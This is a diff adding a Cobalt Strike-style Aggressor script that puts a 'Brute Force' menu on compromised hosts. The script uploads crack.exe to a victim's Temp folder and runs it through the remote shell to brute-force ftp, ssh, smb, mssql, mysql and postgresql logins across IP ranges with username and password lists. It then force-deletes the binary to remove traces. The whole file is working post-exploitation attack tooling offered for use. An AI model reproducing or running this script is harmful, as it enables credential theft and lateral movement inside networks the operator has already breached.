@@ -1,0 +1,55 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       XWAY.CN@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+	    menu "Brute Force" {
+			item "Upload Crack" {
+				$bid = $1;
+				$dialog = dialog("Upload Crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
+				drow_text($dialog, "UploadPath",  "UploadPath:"); 	
+				dbutton_action($dialog, "Upload");
+				dialog_show($dialog);
+        }
+sub crack {
+
+    bcd($bid, $3['UploadPath']);
+
+        bupload($bid, script_resource("/script/crack.exe"));
+    }
+                item "Run crack.exe"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("Run Crack",%(ip => "192.168.1.1/24，192.168.1-255，192.168.1.1", port => "3389", username => "filename list or username", password => "filename list or password", type => "ssh", thread => "Default threads = 100",bid => $bid),&crack_run);
+                    dialog_description($Dialog, "Support ftp，ssh，smb，mssql，mysql, postgresql. Result will save in current_folder/result.txt");
+                    drow_text($Dialog, "ip", "ip: ");
+                    drow_text($Dialog, "port", "port: ");
+					drow_text($Dialog, "username", "username: ");
+					drow_text($Dialog, "password", "password: ");
+					drow_text($Dialog, "type", "type: ");
+					drow_text($Dialog, "thread", "thread: ");
+                    dbutton_action($Dialog, "RUN");
+                    dialog_show($Dialog);
+                }
+
+sub crack_run{
+    local('$Name $port $username $password $type $thread');
+    $Name = $3['ip'];
+    $port = replace($3['port'], "\"", "");
+	$username = $3['username'];
+	$password = $3['password'];
+	$type = $3['type'];
+	$thread = $3['thread'];
+	bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
+}  
+        	item "Remove crack.exe"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q crack.exe");
+        	}
+		}  
+	  
+	  }
